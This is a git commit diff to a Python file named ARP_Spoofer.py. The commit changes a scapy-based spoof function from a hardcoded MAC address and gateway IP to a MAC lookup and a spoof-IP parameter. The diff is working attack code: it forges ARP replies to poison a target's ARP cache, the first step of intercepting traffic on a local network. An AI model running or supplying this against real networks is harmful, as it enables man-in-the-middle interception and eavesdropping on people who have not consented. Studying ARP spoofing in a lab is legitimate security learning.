6236d0663f1aa4fc02c4be225d5bc41433270d50
Paul St. Amour <paul35444@aol.com>
2021-02-23 11:01:47 -0600

    - changed hardcoded mac and spoof ip items to inputs

--- ARP_Spoofer.py
+++ ARP_Spoofer.py
@@ -11,6 +11,8 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:01:af:01", psrc="10.0.1.1") #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
     scapy.send(packet)
 
+get_mac("10.0.1.1")
